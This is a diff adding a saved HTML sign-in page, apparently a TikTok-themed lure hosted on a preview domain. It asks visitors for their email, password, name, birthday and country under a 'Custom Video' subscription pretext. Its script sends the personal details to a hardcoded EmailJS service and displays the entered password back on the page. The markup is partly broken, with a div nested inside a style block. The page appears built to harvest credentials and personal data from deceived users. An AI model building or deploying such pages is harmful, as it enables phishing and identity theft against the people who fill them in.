@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://hitiktok.w3spaces-preview.com/request.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in Custom Video</title>
+   <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h1 {
+            color: #ff4500;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="date"],
+        select,
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff4500;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #ff6347;
+        }
+
+        .message {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .success {
+            color: green;
+        }
+
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://hitiktok.w3spaces-preview.com/request.html" alt="Website Logo">
+        <h1>Sign in</h1>
+        <form id="emailForm" method="post">
+            <input type="email" name="email" placeholder="Email" required="">
+            <input type="password" name="password" placeholder="Password" required="">
+            <input type="text" name="firstName" placeholder="First Name" required="">
+            <input type="text" name="lastName" placeholder="Last Name" required="">
+            <input type="date" name="birthday" placeholder="Birthday" required="">
+            <select name="residence" required="">
+                <option value="" disabled="" selected="">Select your residence</option>
+                <optgroup label="Countries">
+                    <option value="America">America</option>
+                    <option value="Israel">Israel</option>
+                    <option value="Germany">Germany</option>
+                    <!-- ... Add more country options ... -->
+                </optgroup>
+            </select>
+            <input type="submit" value="Subscribe">
+<style>
+<div class="loader">
+.loader {
+  width: fit-content;
+  font-weight: bold;
+  font-family: sans-serif;
+  font-size: 30px;
+  padding-bottom: 8px;
+  background: linear-gradient(currentColor 0 0) 0 100%/0% 3px no-repeat;
+  animation: l2 2s linear infinite;
+}
+.loader:before {
+  content:"Loading..."
+}
+@keyframes l2 {to{background-size: 100% 3px}}
+</style>
+
+        </form>
+        <p class="message success">Thank you for signing up to our site! You will receive updates within two days. <a href="https://hitiktok.w3spaces-preview.com/Custom_Video.html" style="color: green;">Click here</a> to visit our main website.</p>
+        <p class="message error">Oops, there was an error. Please check your information and try again.</p>
+        <p class="note">Note: Keep your details secret and don't be afraid to reveal and remember what they are.</p>
+
+        <!-- New section to display submitted details -->
+        <div class="submitted-details" style="display: none;">
+            <h2>Submitted Details:</h2>
+            <p><strong>Email:</strong> <span id="submitted-email"></span></p>
+            <p><strong>Password:</strong> <span id="submitted-password"></span></p>
+            <p><strong>First Name:</strong> <span id="submitted-firstName"></span></p>
+            <p><strong>Last Name:</strong> <span id="submitted-lastName"></span></p>
+            <p><strong>Birthday:</strong> <span id="submitted-birthday"></span></p>
+            <p><strong>Residence:</strong> <span id="submitted-residence"></span></p>
+        </div>
+    </div>
+
+    <script src="./Sign in Custom Video_files/email.min.js.הורדה"></script>
+    <script>
+        emailjs.init("isxsEbX5RBJP-MYIV");
+
+        document.getElementById('emailForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementsByName('email')[0].value;
+            const password = document.getElementsByName('password')[0].value;  // New line
+            const firstName = document.getElementsByName('firstName')[0].value;
+            const lastName = document.getElementsByName('lastName')[0].value;
+            const birthday = document.getElementsByName('birthday')[0].value;
+            const residence = document.getElementsByName('residence')[0].value;
+
+            const params = {
+                to_email: email,
+                message_html: `Dear ${firstName} ${lastName}, Thank you for joining Custom Video Website. We wish you a fantastic birthday on ${birthday} and we'll keep you updated with mind-blowing updates and exclusive offers! You're from ${residence}.`
+            };
+
+            emailjs.send("service_2l7g432", "template_c40zie7", params)
+                .then(function(response) {
+                    console.log("Email sent successfully!", response);
+                    document.getElementById('emailForm').style.display = 'none';
+                    document.querySelector('.message.success').style.display = 'block';
+                    document.querySelector('.message.error').style.display = 'none';
+
+                    // Display submitted details
+                    document.querySelector('.submitted-details').style.display = 'block';
+                    document.querySelector('#submitted-email').textContent = email;
+                    document.querySelector('#submitted-password').textContent = password;  // New line
+                    document.querySelector('#submitted-firstName').textContent = firstName;
+                    document.querySelector('#submitted-lastName').textContent = lastName;
+                    document.querySelector('#submitted-birthday').textContent = birthday;
+                    document.querySelector('#submitted-residence').textContent = residence;
+                })
+                .catch(function(error) {
+                    console.log("Failed to send email.", error);
+                    document.getElementById('emailForm').style.display = 'none';
+                    document.querySelector('.message.error').style.display = 'block';
+                    document.querySelector('.message.success').style.display = 'none';
+                });
+        });
+    </script>
+
+</body></html>
